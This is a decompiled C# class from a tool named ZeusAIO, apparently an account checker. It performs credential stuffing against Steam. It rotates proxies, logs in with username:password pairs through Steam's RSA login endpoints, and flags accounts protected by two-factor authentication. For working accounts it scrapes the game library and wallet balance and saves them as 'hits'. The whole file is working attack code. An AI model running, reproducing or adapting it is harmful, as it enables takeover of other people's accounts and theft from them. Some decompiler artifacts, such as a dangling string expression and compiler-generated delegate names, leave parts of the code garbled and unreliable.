// Decompiled with JetBrains decompiler
// Type: Steam.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
using ZeusAIO;

namespace Steam
{
  internal class Check
  {
    private static Random random = new Random();

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              CookieStorage cookieStorage = new CookieStorage();
              httpRequest.Cookies = cookieStorage;
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              if (!httpRequest.Get("https://store.steampowered.com/login/?l=english").ToString().Contains("<title>Login</title>"))
              {
                ++mainmenu.errors;
              }
              else
              {
                httpRequest.Referer = "https://help.steampowered.com/en/wizard/Login?redir=%2Fen%2F";
                string input1 = httpRequest.Post("https://help.steampowered.com/en/login/getrsakey/", "username=" + s[0], "application/x-www-form-urlencoded").ToString();
                string mod = Regex.Match(input1, "publickey_mod\":\"(.*?)\"").Groups[1].Value;
                string exp = Regex.Match(input1, "publickey_exp\":\"(.*?)\"").Groups[1].Value;
                string str1 = Regex.Match(input1, "timestamp\":\"(.*?)\"").Groups[1].Value;
                string str2 = HttpUtility.UrlEncode(Check.RSAEncryption(s[1], mod, exp));
                httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36";
                httpRequest.Referer = "https://help.steampowered.com/en/wizard/Login?redir=%2Fen%2F";
                httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                string input2 = httpRequest.Post(new Uri("https://help.steampowered.com/en/login/dologin/"), (HttpContent) new BytesContent(Encoding.Default.GetBytes("password=" + str2 + "&username=" + s[0] + "&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp=" + str1 + "&remember_login=false"))).ToString();
                if (input2.Contains("requires_twofactor\":true,\"") || input2.Contains("emailauth_needed\":true"))
                {
                  ++mainmenu.frees;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[2FA - STEAM] " + s[0] + ":" + s[1], Color.OrangeRed);
                  Export.AsResult("/Steam_2fa", s[0] + ":" + s[1] + " | 2fa");
                  return false;
                }
                if (input2.Contains("success\":true"))
                {
                  httpRequest.Cookies.Add(new Cookie("steamLoginSecure", httpRequest.Cookies.GetCookies("https://help.steampowered.com")["steamLoginSecure"].Value, "", "store.steampowered.com"));
                  httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                  httpRequest.Referer = "https://store.steampowered.com/login/?l=english";
                  string input3 = httpRequest.Get("https://store.steampowered.com/account/").ToString();
                  string str3 = Regex.Match(input2, "\"steamid\":(.*?),").Groups[1].Value.Replace("\"", "");
                  httpRequest.Cookies.Add(new Cookie("steamLoginSecure", httpRequest.Cookies.GetCookies("https://help.steampowered.com")["steamLoginSecure"].Value, "", "steamcommunity.com"));
                  httpRequest.Cookies.Add(new Cookie("sessionid", httpRequest.Cookies.GetCookies("https://help.steampowered.com")["sessionid"].Value, "", "steamcommunity.com"));
                  httpRequest.Cookies.Add(new Cookie("steamLoginSecure", httpRequest.Cookies.GetCookies("https://help.steampowered.com")["steamLoginSecure"].Value, "", "steamcommunity.com"));
                  string input4 = httpRequest.Get("https://steamcommunity.com/profiles/" + str3 + "/games/?tab=all").ToString();
                  if (input3.Contains("s account</title>"))
                  {
                    string str4 = Regex.Match(input3, "class=\"accountData price\"><a href=\"https://store.steampowered.com/account/history/\">(.*?)<").Groups[1].Value;
                    string str5 = "";
                    Match match = Regex.Match(input4, ",\"name\":\"(.*?)\"");
                    string str6;
                    while (true)
                    {
                      str6 = str5 + match.Groups[1].Value;
                      match = match.NextMatch();
                      if (!(match.Groups[1].Value == ""))
                        str5 = str6 + ", ";
                      else
                        break;
                    }
                    ++mainmenu.hits;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[HIT - STEAM] " + s[0] + ":" + s[1] + " | Games: " + str6 + " | Balance: " + str4, Color.Green);
                    Export.AsResult("/Steam_hits", s[0] + ":" + s[1] + " | Games: " + str6 + " | Balance: " + str4);
                    return false;
                  }
                }
                else if (input2.Contains("captcha_needed\":true"))
                  ++mainmenu.errors;
                else if (input2.Contains("Incorrect account name or password.") || input2.Contains("The account name or password that you have entered is incorrect"))
                  break;
              }
            }
          }
          catch
          {
            ++mainmenu.errors;
          }
        }
      }
      return true;
    }

    public static string RSAEncryption(string strText, string mod, string exp)
    {
      "<RSAKeyValue><Modulus>" + Check.HexString2B64String(mod) + "</Modulus><Exponent>" + Check.HexString2B64String(exp) + "</Exponent></RSAKeyValue>";
      byte[] bytes = Encoding.UTF8.GetBytes(strText);
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(1024))
      {
        try
        {
          cryptoServiceProvider.ImportParameters(new RSAParameters()
          {
            Modulus = Check.HexStringToHex(mod),
            Exponent = Check.HexStringToHex(exp)
          });
          return Convert.ToBase64String(cryptoServiceProvider.Encrypt(bytes, false));
        }
        finally
        {
          cryptoServiceProvider.PersistKeyInCsp = false;
        }
      }
    }

    public static string GetRandomHexNumber(int digits)
    {
      byte[] buffer = new byte[digits / 2];
      Check.random.NextBytes(buffer);
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: method pointer
      string str = string.Concat(((IEnumerable<string>) Enumerable.Select<byte, string>((IEnumerable<M0>) buffer, (Func<M0, M1>) (Check.\u003C\u003Ec.\u003C\u003E9__3_0 ?? (Check.\u003C\u003Ec.\u003C\u003E9__3_0 = new Func<byte, string>((object) Check.\u003C\u003Ec.\u003C\u003E9, __methodptr(\u003CGetRandomHexNumber\u003Eb__3_0)))))).ToArray<string>());
      return digits % 2 == 0 ? str : str + Check.random.Next(16).ToString("X");
    }

    public static byte[] HexStringToHex(string inputHex)
    {
      byte[] numArray = new byte[inputHex.Length / 2];
      for (int index = 0; index < numArray.Length; ++index)
        numArray[index] = Convert.ToByte(inputHex.Substring(index * 2, 2), 16);
      return numArray;
    }

    public static string HexString2B64String(string input) => Convert.ToBase64String(Check.HexStringToHex(input));
  }
}
